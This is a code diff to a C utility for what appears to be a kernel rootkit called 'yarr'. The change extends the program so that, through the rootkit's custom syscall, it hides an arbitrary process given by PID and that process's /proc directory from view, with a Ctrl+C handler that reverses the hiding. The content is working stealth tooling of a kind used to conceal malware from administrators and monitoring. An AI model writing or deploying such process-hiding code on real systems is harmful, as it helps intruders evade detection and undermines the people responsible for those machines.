@@ -7,6 +7,11 @@
 
 #include "types.h"
 
+#define PROCDIR_LEN (128)
+
+static pid_t pid;
+static char procdir[PROCDIR_LEN];
+
 /***
  * SIGINT handler. When ctrl + c is pushed the task tries to stop being
  * hide.
@@ -14,22 +19,34 @@
 void term_handler(int sig) {
 	syscallData data;
 
-	data.pid = getpid();
+	data.pid = pid;
 	syscall(YARR_SYSCALL, STOP_HIDE_PROCESS, &data);
+
+	data.filename = procdir;
+	syscall(YARR_SYSCALL, STOP_HIDE_FILE, &data);
 	exit(0);
 }
 
 /***
- * This program just tries to hides itself using yarr, then it goes into an
- * infinite loop until a signal (or anything) cause it to end.
+ * This program tries to hide the process with the PID passed or itself if
+ * no PID was given.
  */
 int main(int argc, char *argv[]) {
 	syscallData data;
 
-	// Hide myself.
-	data.pid = getpid();
-	printf("Process %d will hide.\n", data.pid);
+	if (argc < 2)
+		pid = getpid();
+	else
+		pid = atoi(argv[1]);
+
+	printf("Hiding task %d.\n", pid);
+	data.pid = pid;
 	syscall(YARR_SYSCALL, HIDE_PROCESS, &data);
+
+	printf("Hiding /proc/%d interface.\n", pid);
+	snprintf(procdir, PROCDIR_LEN, "/proc/%d", pid);
+	data.filename = procdir;
+	syscall(YARR_SYSCALL, HIDE_FILE, &data);
 
 	// Set the handler for SIGINT.
 	signal(SIGINT, term_handler);
